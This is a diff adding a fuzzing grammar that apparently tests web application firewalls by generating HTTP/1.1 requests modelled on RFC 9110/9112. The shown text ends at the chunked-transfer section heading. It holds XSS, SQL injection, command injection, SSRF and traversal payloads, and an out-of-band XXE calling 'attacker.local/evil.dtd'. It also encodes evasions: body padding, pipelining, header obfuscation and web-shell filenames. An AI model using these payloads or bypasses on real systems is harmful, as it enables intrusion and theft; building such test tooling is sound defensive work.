@@ -1,0 +1,845 @@
+# =============================================================================
+# HTTP/1.1 Request Grammar — RFC 9110/9112 Precise Model v2
+#
+# Decomposes HTTP requests into RFC-defined components so the grammar
+# mutator's AST splice/swap operates at semantically meaningful boundaries.
+#
+# v2 improvements over v1:
+#   - Cross-grammar references: @uri, @multipart, @cookie for deep variation
+#   - Every meaningful component is a named <rule> = AST splice point
+#   - HTTP pipelining: clean-request + payload-request in one stream
+#   - Body padding (nowafpls): 64KB+ junk to exhaust WAF inspection limits
+#   - Line terminator mixing: bare-LF, bare-CR, mixed within a request
+#   - OWS (optional whitespace) variations per RFC 9112 §5
+#   - Decomposed header-field: <field_name> ":" <ows> <field_value> <ows>
+#
+# References:
+#   RFC 9110 — HTTP Semantics
+#   RFC 9112 — HTTP/1.1 Message Syntax
+#   RFC 7578 — Multipart Form Data
+#   RFC 2046 — MIME Multipart
+#   RFC 6265 — HTTP State Management (Cookies)
+#   nowafpls — WAF inspection limit bypass (body padding)
+# =============================================================================
+
+!root <http_request>
+!max_depth 8
+!import uri
+!import multipart
+!import cookie
+
+# =============================================================================
+# §1  Top-level request shapes
+# =============================================================================
+# RFC 9112 §3: HTTP-message = request-line *(header-field CRLF) CRLF [body]
+
+<http_request> = [weight=4] <request_with_body>
+<http_request> = [weight=2] <request_no_body>
+<http_request> = [weight=2] <chunked_request>
+<http_request> = [weight=2] <multipart_request>
+# HTTP pipelining: WAF inspects first (clean) request, backend also sees second (payload)
+<http_request> = <pipelined_request>
+# Body padding: 64KB+ junk pushes payload past WAF inspection byte limit
+<http_request> = <padded_body_request>
+# Line terminator mixing (bare-LF / bare-CR entire request)
+<http_request> = <bare_lf_request>
+
+# =============================================================================
+# §2  Request Line — RFC 9112 §3
+#     request-line = method SP request-target SP HTTP-version <line_end>
+# =============================================================================
+
+<request_line> = <method><sp_sep><request_target><sp_sep><http_version><line_end>
+<request_line_body> = <method_body><sp_sep><request_target><sp_sep><http_version><line_end>
+<request_line_nobody> = <method_nobody><sp_sep><request_target><sp_sep><http_version><line_end>
+
+# ─── §2.0  SP separator — RFC 9112 §3 requires exactly one SP ────────────
+# But parsers accept HTAB, multiple spaces, etc.
+
+<sp_sep> = [weight=8] <sp>
+<sp_sep> = <htab>
+<sp_sep> = <sp><sp>
+<sp_sep> = <sp><htab>
+
+# ─── §2.1  Method — RFC 9110 §9 ───────────────────────────────────────────
+
+# Methods that conventionally carry a request body
+<method_body> = [weight=6] POST
+<method_body> = [weight=2] PUT
+<method_body> = PATCH
+
+# Methods that conventionally have no body
+<method_nobody> = [weight=4] GET
+<method_nobody> = HEAD
+<method_nobody> = DELETE
+<method_nobody> = OPTIONS
+
+# Full method set (for edge-case testing: GET-with-body, etc.)
+<method> = [weight=4] POST
+<method> = [weight=3] GET
+<method> = PUT
+<method> = DELETE
+<method> = PATCH
+<method> = OPTIONS
+<method> = HEAD
+<method> = TRACE
+# WebDAV / extension methods — WAF must decide whether to inspect body
+<method> = PROPFIND
+<method> = MKCOL
+<method> = REPORT
+<method> = MOVE
+# Case variations — RFC 9110 §9.1: method is case-sensitive token
+<method> = post
+<method> = Post
+<method> = get
+<method> = gEt
+
+# ─── §2.2  HTTP-version — RFC 9112 §2.3 ──────────────────────────────────
+# HTTP-version = HTTP-name "/" DIGIT "." DIGIT
+
+<http_version> = [weight=8] HTTP/1.1
+<http_version> = [weight=2] HTTP/1.0
+# Malformed / unusual (parser differential targets)
+<http_version> = HTTP/2.0
+<http_version> = HTTP/0.9
+<http_version> = HTTP/1.2
+<http_version> = http/1.1
+<http_version> = HTTP /1.1
+<http_version> = HTTP/1.1
+
+# ─── §2.3  Request Target — RFC 9112 §3.2 ────────────────────────────────
+# Four forms: origin, absolute, authority, asterisk
+
+<request_target> = [weight=6] <origin_form>
+<request_target> = [weight=2] <absolute_form>
+<request_target> = *
+# Cross-grammar: full RFC 3986 URI (788 rules of encoding/path/host variation)
+<request_target> = @uri:<path_absolute>
+
+# §2.3.1  origin-form = absolute-path [ "?" query ]  (RFC 9112 §3.2.1)
+<origin_form> = [weight=3] <abs_path>
+<origin_form> = [weight=3] <abs_path>?<query>
+# Path with fragment (illegal per RFC, but some parsers accept)
+<origin_form> = <abs_path>#<fragment>
+
+# §2.3.2  absolute-form = absolute-URI  (RFC 9112 §3.2.2)
+<absolute_form> = http://<host_value><abs_path>
+<absolute_form> = https://<host_value><abs_path>
+# Scheme confusion
+<absolute_form> = http://<host_value>:<port_value><abs_path>
+# SSRF via absolute-form — WAF may not normalize
+<absolute_form> = http://@uri:<ssrf_bypass_host><abs_path>
+
+# ─── §2.4  Path — RFC 3986 §3.3 ──────────────────────────────────────────
+
+<abs_path> = [weight=3] /<path_word>
+<abs_path> = [weight=3] /<path_word>/<path_word>
+<abs_path> = /<path_word>/<path_word>/<path_word>
+# Path normalization traps
+<abs_path> = /.//<path_word>
+<abs_path> = /<path_word>/../<path_word>
+<abs_path> = /<path_word>;jsessionid=<hex len=16>/<path_word>
+# Cross-grammar: RFC 3986 path segments with traversal, encoding, semicolons
+<abs_path> = @uri:<path_absolute>
+
+<path_word> = [weight=2] reflect
+<path_word> = [weight=2] api
+<path_word> = search
+<path_word> = upload
+<path_word> = submit
+<path_word> = admin
+<path_word> = data
+<path_word> = login
+<path_word> = users
+<path_word> = graphql
+<path_word> = v1
+<path_word> = v2
+<path_word> = <string min=3 max=10 charset=lower>
+
+# ─── §2.5  Query — RFC 3986 §3.4 ─────────────────────────────────────────
+
+<query> = [weight=2] <qparam>
+<query> = [weight=2] <qparam><query_sep><qparam>
+<query> = <qparam><query_sep><qparam><query_sep><qparam>
+# HPP: duplicate parameter names (RFC does not forbid)
+<query> = <qkey>=safe<query_sep><qkey>=<payload>
+# Cross-grammar: full RFC 3986 query with HPP, array notation, encoding tricks
+<query> = @uri:<query>
+
+# Query separator — & vs ; ambiguity (RFC does not specify)
+<query_sep> = [weight=5] &
+<query_sep> = ;
+
+<qparam> = <qkey>=<qvalue>
+
+<qkey> = [weight=2] q
+<qkey> = id
+<qkey> = search
+<qkey> = page
+<qkey> = callback
+<qkey> = redirect
+<qkey> = url
+<qkey> = <string min=2 max=6 charset=lower>
+
+<qvalue> = [weight=2] <canary>
+<qvalue> = [weight=2] <payload>
+<qvalue> = <string min=2 max=12 charset=alphanumeric>
+<qvalue> = <int min=1 max=9999>
+
+<fragment> = section1
+<fragment> = top
+<fragment> = @uri:<fragment>
+
+# ─── §2.6  Port ───────────────────────────────────────────────────────────
+
+<port_value> = 80
+<port_value> = 443
+<port_value> = 8080
+<port_value> = <int min=1024 max=65535>
+
+# =============================================================================
+# §3  Header Fields — RFC 9110 §5.1 / RFC 9112 §5
+#     header-field = field-name ":" OWS field-value OWS
+# =============================================================================
+
+# ─── §3.0  Line ending (splice point for LF/CRLF mixing) ────────────────
+
+<line_end> = [weight=8] <crlf>
+<line_end> = <nl>
+<line_end> = <cr>
+
+# ─── §3.0.1  OWS — RFC 9110 §5.6.3 ─────────────────────────────────────
+# OWS = *( SP / HTAB )
+# Required after ":" in header-field per RFC 9112 §5.1
+
+<ows> = [weight=7] <sp>
+<ows> = <empty>
+<ows> = <sp><sp>
+<ows> = <htab>
+<ows> = <sp><htab>
+
+# ─── §3.1  Host (REQUIRED) — RFC 9112 §3.3 ───────────────────────────────
+
+<host_header> = <host_name>:<ows><host_value><line_end>
+
+<host_name> = [weight=8] Host
+<host_name> = host
+<host_name> = HOST
+<host_name> = hOsT
+
+<host_value> = [weight=5] target.local
+<host_value> = target.local:8080
+<host_value> = <string min=3 max=10 charset=lower>.local
+<host_value> = 127.0.0.1
+<host_value> = [::1]
+# Cross-grammar: RFC 3986 host with IDN, punycode, bracket confusion
+<host_value> = @uri:<host>
+
+# ─── §3.2  Content-Type — RFC 9110 §8.3 ──────────────────────────────────
+
+<ct_header> = <ct_field_name>:<ows><ct_value><line_end>
+
+<ct_field_name> = [weight=7] Content-Type
+<ct_field_name> = content-type
+<ct_field_name> = CONTENT-TYPE
+<ct_field_name> = Content-type
+
+# Standard types
+<ct_form_val> = application/x-www-form-urlencoded
+<ct_json_val> = [weight=2] application/json
+<ct_json_val> = application/json; charset=utf-8
+<ct_xml_val> = [weight=2] application/xml
+<ct_xml_val> = text/xml
+<ct_xml_val> = text/xml; charset=utf-8
+<ct_plain_val> = text/plain
+<ct_html_val> = [weight=2] text/html
+<ct_html_val> = text/html; charset=utf-8
+
+# Charset confusion — CVE-2026-21876 (CRS rule 922110 bypass)
+<ct_charset_val> = text/html; charset=utf-7
+<ct_charset_val> = text/html; charset=utf-16
+<ct_charset_val> = text/html; charset=ibm037
+<ct_charset_val> = text/html; charset=shift_jis
+<ct_charset_val> = application/x-www-form-urlencoded; charset=ibm037
+
+# Type confusion — WAF parses as X, backend parses as Y
+<ct_confusion_val> = text/plain; boundary=wfbound
+<ct_confusion_val> = application/octet-stream
+# Case/spacing tricks
+<ct_confusion_val> = Application/JSON
+<ct_confusion_val> = application/x-www-form-urlencoded ;
+# CT removal — rely on content sniffing
+<ct_confusion_val> = x-application/x-undefined
+
+# Wrappers for assembly
+<ct_form> = <ct_field_name>:<ows><ct_form_val><line_end>
+<ct_json> = <ct_field_name>:<ows><ct_json_val><line_end>
+<ct_xml> = <ct_field_name>:<ows><ct_xml_val><line_end>
+<ct_html> = <ct_field_name>:<ows><ct_html_val><line_end>
+<ct_plain> = <ct_field_name>:<ows><ct_plain_val><line_end>
+<ct_charset_trick> = <ct_field_name>:<ows><ct_charset_val><line_end>
+<ct_confusion> = <ct_field_name>:<ows><ct_confusion_val><line_end>
+# Duplicate CT (RFC 9110 §5.2: recipient behavior undefined)
+<ct_confusion> = <ct_field_name>:<ows>text/plain<line_end><ct_field_name>:<ows>application/x-www-form-urlencoded<line_end>
+
+# ─── §3.3  Content-Length — RFC 9112 §6.3 ─────────────────────────────────
+# CL value is approximate; mutator recalculates to match actual body
+
+<cl_header> = <cl_field_name>:<ows><cl_value><line_end>
+
+<cl_field_name> = [weight=8] Content-Length
+<cl_field_name> = content-length
+# Whitespace before colon — RFC 9112 forbids, but some parsers accept
+<cl_field_name> = Content-Length<sp>
+<cl_field_name> = Content-Length<htab>
+
+<cl_value> = [weight=5] <int min=10 max=512>
+<cl_value> = 0
+# Malformed CL (parser differential)
+<cl_value> = +42
+<cl_value> = 42
+<cl_value> = 042
+
+# ─── §3.4  Transfer-Encoding — RFC 9112 §6.1 ─────────────────────────────
+
+<te_chunked> = <te_field_name>:<ows>chunked<line_end>
+
+<te_field_name> = [weight=7] Transfer-Encoding
+<te_field_name> = transfer-encoding
+<te_field_name> = Transfer-encoding
+<te_field_name> = TRANSFER-ENCODING
+
+# TE obfuscation variants — parser differential targets
+<te_obfused> = [weight=3] <te_field_name>:<ows>chunked<line_end>
+<te_obfused> = <te_field_name>:<sp><sp>chunked<line_end>
+<te_obfused> = <te_field_name>:<htab>chunked<line_end>
+<te_obfused> = <te_field_name>:<ows>Chunked<line_end>
+<te_obfused> = <te_field_name>:<ows>CHUNKED<line_end>
+<te_obfused> = <te_field_name>:<ows>chunked, identity<line_end>
+<te_obfused> = <te_field_name>:<ows>,chunked<line_end>
+# Doubled TE — RFC 9112 §6.1: "A sender MUST NOT apply chunked more than once"
+<te_obfused> = <te_field_name>:<ows>chunked<line_end><te_field_name>:<ows>identity<line_end>
+# TE with surrounding whitespace
+<te_obfused> = <te_field_name>:<ows> chunked <line_end>
+
+# ─── §3.5  Content-Encoding — RFC 9110 §8.4 ──────────────────────────────
+
+<ce_header> = Content-Encoding:<ows><ce_value><line_end>
+<ce_value> = gzip
+<ce_value> = deflate
+<ce_value> = br
+<ce_value> = identity
+# Stacked encodings (applied in listed order)
+<ce_value> = gzip, deflate
+<ce_value> = deflate, gzip
+
+# ─── §3.6  Connection — RFC 9112 §9.1 ────────────────────────────────────
+
+<connection_header> = Connection:<ows><connection_value><line_end>
+<connection_value> = [weight=3] keep-alive
+<connection_value> = [weight=2] close
+<connection_value> = Keep-Alive
+<connection_value> = keep-alive, Upgrade
+
+# ─── §3.7  Expect — RFC 9110 §10.1.1 (CVE-2025-32094 Akamai desync) ─────
+
+<expect_header> = Expect:<ows>100-continue<line_end>
+<expect_header> = Expect:<ows>100-Continue<line_end>
+<expect_header> = Expect:<ows>100-CONTINUE<line_end>
+# Obs-fold variant (CVE-2025-32094 exact pattern)
+<expect_header> = Expect:<ows>100<crlf> -continue<line_end>
+
+# ─── §3.8  User-Agent ────────────────────────────────────────────────────
+
+<ua_header> = User-Agent:<ows><ua_value><line_end>
+<ua_value> = [weight=3] wf-grammar/2.0
+<ua_value> = Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+<ua_value> = curl/8.7.1
+<ua_value> = python-requests/2.32.0
+
+# ─── §3.9  Accept / Content Negotiation — RFC 9110 §12 ──────────────────
+
+<accept_header> = Accept:<ows><accept_value><line_end>
+<accept_value> = [weight=2] */*
+<accept_value> = text/html, application/xhtml+xml, */*;q=0.8
+<accept_value> = application/json
+<accept_value> = text/xml, application/xml
+
+<accept_enc_header> = Accept-Encoding:<ows><accept_enc_value><line_end>
+<accept_enc_value> = gzip, deflate, br
+<accept_enc_value> = identity
+<accept_enc_value> = *
+
+<accept_charset_header> = Accept-Charset:<ows><accept_charset_value><line_end>
+<accept_charset_value> = utf-8
+<accept_charset_value> = utf-7, utf-8;q=0.9
+<accept_charset_value> = iso-8859-1, utf-8;q=0.7
+
+# ─── §3.10  TE request header — RFC 9110 §10.1.4 ────────────────────────
+
+<te_req_header> = TE:<ows><te_req_value><line_end>
+<te_req_value> = trailers
+<te_req_value> = trailers, deflate
+<te_req_value> = chunked
+
+# ─── §3.11  Authorization — RFC 9110 §11.6 ──────────────────────────────
+
+<auth_header> = Authorization:<ows><auth_value><line_end>
+<auth_value> = Basic <string min=16 max=32 charset=alphanumeric>=
+<auth_value> = Bearer <string min=32 max=64 charset=alphanumeric>
+<auth_value> = Bearer eyJ<string min=20 max=40 charset=alphanumeric>
+
+# ─── §3.12  Cookie — RFC 6265 §5.4 ──────────────────────────────────────
+
+<cookie_header> = Cookie:<ows><cookie_value><line_end>
+<cookie_value> = [weight=2] session=<string min=16 max=32 charset=hex>
+<cookie_value> = session=<string min=16 max=32 charset=hex>; user=<string min=4 max=12 charset=lower>
+<cookie_value> = JSESSIONID=<string min=24 max=32 charset=alphanumeric>
+# Cookie with payload (WAF may not inspect cookie values)
+<cookie_value> = session=<string min=8 max=16 charset=hex>; data=<payload>
+# Cross-grammar: full RFC 6265bis cookie with CVE patterns, prefix bypass
+<cookie_value> = @cookie:<cookie_header>
+
+# ─── §3.13  Forwarding / Routing — proxy context ────────────────────────
+
+<forwarding_header> = <fwd_field_name>:<ows><fwd_value><line_end>
+
+<fwd_field_name> = X-Forwarded-For
+<fwd_field_name> = X-Real-IP
+<fwd_field_name> = X-Forwarded-Host
+<fwd_field_name> = X-Original-URL
+<fwd_field_name> = X-Rewrite-URL
+<fwd_field_name> = Forwarded
+
+<fwd_value> = <fwd_ip>
+<fwd_value> = <host_value>
+<fwd_value> = <abs_path>
+<fwd_value> = for=<fwd_ip>;host=<host_value>;proto=https
+
+<fwd_ip> = 127.0.0.1
+<fwd_ip> = 10.0.0.<int min=1 max=254>
+<fwd_ip> = <int min=1 max=223>.<int min=0 max=255>.<int min=0 max=255>.<int min=1 max=254>
+
+# ─── §3.14  Cache — RFC 9111 §5.2 ───────────────────────────────────────
+
+<cache_header> = Cache-Control:<ows><cache_value><line_end>
+<cache_value> = no-cache
+<cache_value> = no-store
+<cache_value> = max-age=0
+<cache_value> = s-maxage=0, no-transform
+
+# ─── §3.15  Referer / Origin — RFC 9110 §10.1.3 ─────────────────────────
+
+<referer_header> = Referer:<ows>http://<host_value><abs_path><line_end>
+<origin_header> = Origin:<ows>http://<host_value><line_end>
+<origin_header> = Origin:<ows>https://<host_value><line_end>
+
+# ─── §3.16  Trailer — RFC 9112 §6.1.3 ───────────────────────────────────
+
+<trailer_decl> = Trailer:<ows><trailer_names><line_end>
+<trailer_names> = X-Checksum
+<trailer_names> = X-Checksum, X-Signature
+<trailer_names> = Content-MD5
+<trailer_names> = Host
+<trailer_names> = X-Original-URL
+
+# ─── §3.17  Range — RFC 9110 §14.2 ──────────────────────────────────────
+
+<range_header> = Range:<ows>bytes=<range_spec><line_end>
+<range_spec> = 0-499
+<range_spec> = 0-
+<range_spec> = -500
+<range_spec> = 0-100, 50-200, 100-300
+
+# ─── §3.18  Obs-fold — RFC 9112 §5.2 (deprecated, widely parsed) ────────
+
+<obsfold_header> = X-Custom:<ows>safe_prefix<crlf> <payload><line_end>
+<obsfold_header> = X-Custom:<ows>safe_prefix<crlf><htab><payload><line_end>
+# Multi-line obs-fold (2 continuation lines)
+<obsfold_header> = X-Custom:<ows>prefix<crlf> middle<crlf> <payload><line_end>
+
+# ─── §3.19  Custom / injection headers ──────────────────────────────────
+
+<custom_header> = X-Custom-Input:<ows><payload><line_end>
+<custom_header> = X-Debug:<ows><string min=4 max=16 charset=alphanumeric><line_end>
+<custom_header> = X-Request-Id:<ows><hex len=12><line_end>
+# Null byte truncation in header value
+<custom_header> = X-Custom-Input:<ows>safe\x00<payload><line_end>
+
+# ─── §3.20  Upgrade — RFC 9110 §7.8 ─────────────────────────────────────
+
+<upgrade_header> = Upgrade:<ows><upgrade_value><line_end>
+<upgrade_value> = websocket
+<upgrade_value> = h2c
+<upgrade_value> = TLS/1.0
+
+# =============================================================================
+# §4  Optional Header Combos (each combo is one AST node for splicing)
+# =============================================================================
+
+# Core combos — every production is a separate splice target
+<opt_headers> = [weight=3] <base_opts>
+<opt_headers> = [weight=2] <base_opts><extra_opt>
+<opt_headers> = <base_opts><extra_opt><extra_opt>
+
+<base_opts> = <ua_header><connection_header>
+
+<extra_opt> = <accept_header>
+<extra_opt> = <accept_enc_header>
+<extra_opt> = <accept_charset_header>
+<extra_opt> = <forwarding_header>
+<extra_opt> = <cookie_header>
+<extra_opt> = <auth_header>
+<extra_opt> = <expect_header>
+<extra_opt> = <cache_header>
+<extra_opt> = <referer_header>
+<extra_opt> = <origin_header>
+<extra_opt> = <range_header>
+<extra_opt> = <te_req_header>
+<extra_opt> = <obsfold_header>
+<extra_opt> = <custom_header>
+<extra_opt> = <upgrade_header>
+
+# =============================================================================
+# §5  WAF Metadata — X-WF-* headers (in-band oracle classification)
+# =============================================================================
+
+<wf_meta> = X-WF-Request-ID: grammar-<hex len=8><crlf>X-WF-Canary-Marker: <canary><crlf>
+
+# =============================================================================
+# §6  Payloads & Canary
+# =============================================================================
+
+<canary> = WF-CANARY-<hex len=10>
+
+<payload> = [weight=3] <xss_payload>
+<payload> = [weight=3] <sqli_payload>
+<payload> = [weight=2] <cmdi_payload>
+<payload> = <ssrf_payload>
+<payload> = <traversal_payload>
+<payload> = <ssti_payload>
+
+# ─── XSS ─────────────────────────────────────────────────────────────────
+
+<xss_payload> = <lt>script<gt>alert(1)<lt>/script<gt>
+<xss_payload> = <lt>img src=x onerror=alert(1)<gt>
+<xss_payload> = "<gt><lt>svg onload=alert(1)<gt>
+<xss_payload> = javascript:alert(1)
+<xss_payload> = <lt>details open ontoggle=alert(1)<gt>
+<xss_payload> = <lt>body onload=alert(1)<gt>
+<xss_payload> = <lt>iframe src=javascript:alert(1)<gt>
+
+# ─── SQLi ────────────────────────────────────────────────────────────────
+
+<sqli_payload> = ' OR 1=1--
+<sqli_payload> = 1 UNION SELECT username,password FROM users--
+<sqli_payload> = '; DROP TABLE users;--
+<sqli_payload> = ' UNION sleep(5)--
+<sqli_payload> = 1' AND '1'='1
+<sqli_payload> = -1 OR 1=1
+<sqli_payload> = ' OR ''='
+
+# ─── Command Injection ──────────────────────────────────────────────────
+
+<cmdi_payload> = ; cat /etc/passwd
+<cmdi_payload> = | ls -la
+<cmdi_payload> = $(whoami)
+<cmdi_payload> = `id`
+<cmdi_payload> = ;ping -c 1 127.0.0.1
+
+# ─── SSRF ────────────────────────────────────────────────────────────────
+
+<ssrf_payload> = http://169.254.169.254/latest/meta-data/
+<ssrf_payload> = http://127.0.0.1:22/
+<ssrf_payload> = http://0x7f000001/
+<ssrf_payload> = http://[::1]/
+
+# ─── Path Traversal ─────────────────────────────────────────────────────
+
+<traversal_payload> = ../../../../etc/passwd
+<traversal_payload> = ..%2f..%2f..%2fetc%2fpasswd
+<traversal_payload> = ....//....//....//etc/passwd
+
+# ─── SSTI (Server-Side Template Injection) ──────────────────────────────
+
+<ssti_payload> = {{7*7}}
+<ssti_payload> = ${7*7}
+<ssti_payload> = <lt>%= 7*7 %<gt>
+
+# =============================================================================
+# §7  Message Bodies — RFC 9112 §6
+# =============================================================================
+
+# ─── §7.1  application/x-www-form-urlencoded ─────────────────────────────
+
+<form_body> = [weight=2] <fpair>
+<form_body> = [weight=3] <fpair>&<fpair>
+<form_body> = <fpair>&<fpair>&<fpair>
+
+<fpair> = <fkey>=<fval>
+
+<fkey> = [weight=2] param
+<fkey> = data
+<fkey> = input
+<fkey> = search
+<fkey> = username
+<fkey> = password
+<fkey> = cmd
+<fkey> = q
+<fkey> = url
+<fkey> = action
+<fkey> = <string min=2 max=8 charset=lower>
+
+<fval> = [weight=2] <canary>
+<fval> = [weight=2] <payload>
+<fval> = <string min=3 max=16 charset=alphanumeric>
+<fval> = test
+<fval> = 1
+
+# ─── §7.2  application/json ─────────────────────────────────────────────
+
+<json_body> = [weight=2] {"<jkey>":"<jval>"}
+<json_body> = [weight=2] {"<jkey>":"<jval>","<jkey>":"<jval>"}
+<json_body> = {"<jkey>":"<canary>","data":"<payload>"}
+<json_body> = {"<jkey>":["<canary>","<payload>"]}
+<json_body> = {"<jkey>":{"inner":"<payload>"},"c":"<canary>"}
+# Unicode escape hiding — WAF regex won't match \u003c as <
+<json_body> = {"<jkey>":"\u003cscript\u003ealert(1)\u003c/script\u003e","c":"<canary>"}
+
+<jkey> = param
+<jkey> = data
+<jkey> = input
+<jkey> = username
+<jkey> = query
+<jkey> = cmd
+<jkey> = url
+
+<jval> = [weight=2] <canary>
+<jval> = <payload>
+<jval> = <string min=3 max=12 charset=alphanumeric>
+<jval> = test
+
+# ─── §7.3  XML ──────────────────────────────────────────────────────────
+
+<xml_body> = <lt>?xml version="1.0"?<gt><lt>root<gt><lt><xtag><gt><canary><lt>/<xtag><gt><lt><xtag><gt><payload><lt>/<xtag><gt><lt>/root<gt>
+<xml_body> = <lt>root<gt><lt>data<gt><payload><lt>/data<gt><lt>/root<gt>
+# XXE probe
+<xml_body> = <lt>?xml version="1.0"?<gt><lt>!DOCTYPE foo [<lt>!ENTITY xxe SYSTEM "file:///etc/passwd"<gt>]<gt><lt>root<gt>&xxe;<lt>/root<gt>
+# CDATA hiding
+<xml_body> = <lt>root<gt><lt>![CDATA[<payload>]]<gt><lt>/root<gt>
+# Parameter entity (out-of-band XXE)
+<xml_body> = <lt>?xml version="1.0"?<gt><lt>!DOCTYPE foo [<lt>!ENTITY % xxe SYSTEM "http://attacker.local/evil.dtd"<gt>%xxe;]<gt><lt>root<gt>test<lt>/root<gt>
+
+<xtag> = data
+<xtag> = input
+<xtag> = param
+<xtag> = value
+
+# ─── §7.4  Multipart body — RFC 2046 §5.1 / RFC 7578 ───────────────────
+
+# Inline templates (boundary=wfbound)
+<mp_body> = [weight=2] <mp_body_2f>
+<mp_body> = <mp_body_file>
+<mp_body> = <mp_body_dup>
+<mp_body> = <mp_body_preamble>
+<mp_body> = <mp_body_epilogue>
+<mp_body> = <mp_body_hdr_inject>
+# Cross-grammar: boundary=wfbound anchored (matches mp_ct_header)
+<mp_body> = @multipart:<multipart_body_wfbound>
+# Cross-grammar: intentional boundary mismatch (boundary differs from CT header — evasion probe)
+<mp_body> = @multipart:<multipart_body>
+
+# Single field
+<mp_body_1f> = --wfbound<crlf>Content-Disposition: form-data; name="<fkey>"<crlf><crlf><fval><crlf>--wfbound--<crlf>
+# Two fields: safe + payload
+<mp_body_2f> = --wfbound<crlf>Content-Disposition: form-data; name="safe"<crlf><crlf><canary><crlf>--wfbound<crlf>Content-Disposition: form-data; name="data"<crlf><crlf><payload><crlf>--wfbound--<crlf>
+# File upload with filename attack
+<mp_body_file> = --wfbound<crlf>Content-Disposition: form-data; name="file"; filename="<mp_filename>"<crlf>Content-Type: <mp_filect><crlf><crlf><canary><crlf>--wfbound--<crlf>
+# Duplicate param names
+<mp_body_dup> = --wfbound<crlf>Content-Disposition: form-data; name="input"<crlf><crlf>safe_value<crlf>--wfbound<crlf>Content-Disposition: form-data; name="input"<crlf><crlf><payload><crlf>--wfbound--<crlf>
+# Preamble payload
+<mp_body_preamble> = PREAMBLE:<payload><crlf>--wfbound<crlf>Content-Disposition: form-data; name="f"<crlf><crlf><canary><crlf>--wfbound--<crlf>
+# Epilogue payload
+<mp_body_epilogue> = --wfbound<crlf>Content-Disposition: form-data; name="f"<crlf><crlf><canary><crlf>--wfbound--<crlf><payload>
+# Part header injection
+<mp_body_hdr_inject> = --wfbound<crlf>Content-Disposition: form-data; name="f"<crlf>X-Injected: <payload><crlf>Content-Type: text/html<crlf><crlf><canary><crlf>--wfbound--<crlf>
+
+<mp_filename> = upload.txt
+<mp_filename> = test.php
+<mp_filename> = image.jpg
+<mp_filename> = <payload>
+# CVE-2026-33691: extension whitespace padding
+<mp_filename> = shell.php<sp>
+<mp_filename> = shell.jsp<htab>
+<mp_filename> = shell.phar.jpg
+<mp_filename> = shell.asp.
+# Cross-grammar: RFC 7578/2046 filename with traversal, null byte, encoded
+<mp_filename> = @multipart:<filename>
+
+<mp_filect> = application/octet-stream
+<mp_filect> = text/plain
+<mp_filect> = image/jpeg
+
+# ─── §7.5  Chunked body — RFC 9112 §7.1 ─────────────────────────────────
+
+<chunked_body> = [weight=2] <chunk_known><last_chunk>
+<chunked_body> = <chunk_known><chunk_known><last_chunk>
+<chunked_body> = <chunk_known><last_chunk_trailer>
+
+<chunk_known> = <chunk_size_hex><chunk_ext_opt><crlf><chunk_data><crlf>
+
+<chunk_size_hex> = [weight=3] 5
+<chunk_size_hex> = 4
+<chunk_size_hex> = d
+<chunk_size_hex> = 7
+# Leading zeros (parser leniency)
+<chunk_size_hex> = 005
+<chunk_size_hex> = 0005
+# Size mismatch (intentional — parser probe)
+<chunk_size_hex> = ff
+
+# §7.1.1  chunk-ext = *( BWS ";" BWS chunk-ext-name [ BWS "=" BWS chunk-ext-val ] )
+<chunk_ext_opt> = [weight=4] <empty>
+<chunk_ext_opt> = ;ext=val
+<chunk_ext_opt> = ;<string min=2 max=6 charset=lower>=<string min=1 max=4 charset=alphanumeric>
+# Long chunk extension (WAF may truncate inspection)
+<chunk_ext_opt> = ;padding=<string min=32 max=128 charset=alphanumeric>
+# Multiple extensions
+<chunk_ext_opt> = ;a=1;b=2;c=3
+
+<chunk_data> = HELLO
+<chunk_data> = test
+<chunk_data> = param=canary01
+<chunk_data> = data=ok
+<chunk_data> = small
+
+<last_chunk> = 0<crlf><crlf>
+<last_chunk_trailer> = 0<crlf><trailer_fields><crlf>
+
+# ─── §7.5.1  Trailer section — RFC 9112 §7.1.2 ─────────────────────────
+
+<trailer_fields> = [weight=2] <trailer_field>
+<trailer_fields> = <trailer_field><trailer_field>
+
+<trailer_field> = X-Checksum:<ows><hex len=16><line_end>
+<trailer_field> = X-Signature:<ows><hex len=16><line_end>
+# Trailer injection targets (WAFs that merge trailers into response headers)
+<trailer_field> = X-Original-URL:<ows><abs_path><line_end>
+<trailer_field> = Host:<ows><host_value><line_end>
+<trailer_field> = Content-Type:<ows>text/html<line_end>
+<trailer_field> = X-Custom:<ows><payload><line_end>
+
+# =============================================================================
+# §8  Request Assembly
+# =============================================================================
+
+# ─── §8.1  Request with body ────────────────────────────────────────────
+
+<request_with_body> = [weight=4] <request_line_body><host_header><wf_meta><ct_form><cl_header><opt_headers><line_end><form_body>
+<request_with_body> = [weight=3] <request_line_body><host_header><wf_meta><ct_json><cl_header><opt_headers><line_end><json_body>
+<request_with_body> = <request_line_body><host_header><wf_meta><ct_xml><cl_header><opt_headers><line_end><xml_body>
+<request_with_body> = <request_line_body><host_header><wf_meta><ct_html><cl_header><opt_headers><line_end><payload>
+<request_with_body> = <request_line_body><host_header><wf_meta><ct_plain><cl_header><opt_headers><line_end><payload>
+# CT confusion
+<request_with_body> = <request_line_body><host_header><wf_meta><ct_confusion><cl_header><opt_headers><line_end><form_body>
+# Charset tricks (CVE-2026-21876)
+<request_with_body> = <request_line_body><host_header><wf_meta><ct_charset_trick><cl_header><opt_headers><line_end><form_body>
+# GET/DELETE/HEAD with body — RFC 9110 §9.3.1 permits
+<request_with_body> = <method_nobody><sp_sep><request_target><sp_sep><http_version><line_end><host_header><wf_meta><ct_form><cl_header><opt_headers><line_end><form_body>
+# With Content-Encoding mismatch
+<request_with_body> = <request_line_body><host_header><wf_meta><ct_form><cl_header><ce_header><opt_headers><line_end><form_body>
+
+# ─── §8.2  Request without body ─────────────────────────────────────────
+
+<request_no_body> = [weight=2] <request_line_nobody><host_header><wf_meta><opt_headers><line_end>
+# Payload in query string
+<request_no_body> = [weight=2] <method_nobody><sp_sep><abs_path>?q=<payload>&c=<canary><sp_sep><http_version><line_end><host_header><wf_meta><opt_headers><line_end>
+# Payload in custom header value
+<request_no_body> = <request_line_nobody><host_header><wf_meta><custom_header><opt_headers><line_end>
+# Obs-fold payload hiding
+<request_no_body> = <request_line_nobody><host_header><wf_meta><obsfold_header><opt_headers><line_end>
+# Payload in cookie
+<request_no_body> = <method_nobody><sp_sep><abs_path>?c=<canary><sp_sep><http_version><line_end><host_header><wf_meta>Cookie:<ows>data=<payload><line_end><opt_headers><line_end>
+
+# ─── §8.3  Chunked transfer ─────────────────────────────────────────────
+
